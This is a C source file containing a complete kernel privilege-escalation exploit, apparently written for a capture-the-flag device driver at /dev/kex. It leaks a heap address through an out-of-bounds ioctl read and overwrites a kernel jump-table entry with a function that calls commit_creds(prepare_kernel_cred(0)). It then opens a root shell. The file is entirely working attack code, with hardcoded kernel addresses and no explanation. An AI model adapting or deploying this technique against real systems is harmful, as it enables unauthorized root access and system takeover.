#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define ALLOC 0x43544601
#define GETVAL 0x43544602
#define SETVAL 0x43544603
#define FREE 0x43544606
#define NAME 0x43544608

#define ROOT 0x43544605

struct request {
	char buf[0x20];
	unsigned int index;
	unsigned int val;
};

void* (*prepare_kernel_cred)(int) = 0x8014deb0;
void (*commit_creds)(void *) = 0x8014dbb8;

void get_root() {
	asm("la	$s0, 0xC000C280\n"
		"sw	$s0, 0x24($sp)\n"
		);
	commit_creds(prepare_kernel_cred(0));
}

int main(int argc, char **argv) {
	
	int fd = open("/dev/kex", O_RDWR | O_CLOEXEC);
	if (fd == -1) {
		perror("open");
	}

	int ret;
	struct request req;

	strcpy(req.buf, "Lotus337");
	ioctl(fd, ALLOC, &req);
	strcpy(req.buf, "Lotus338");
	ioctl(fd, ALLOC, &req);

	req.index = 0x100;
	req.val = 0;

	ioctl(fd, GETVAL, &req);

	unsigned int chunk1_addr = req.val - 0x400;
	unsigned int jumptable6 = 0xC000C600;

	printf("[+] Got chunk1 @ %#x\n", chunk1_addr);

	strcpy(req.buf, "Lotus337");
	req.index = (jumptable6 - chunk1_addr) >> 2;
	req.val = get_root;

	ioctl(fd, SETVAL, &req);

	ioctl(fd, ROOT, NULL);

	if (getuid() == 0) {
		printf("[!] Got root!!!\n");
		system("/bin/sh");
	}
	close(fd);
	return 0;
}
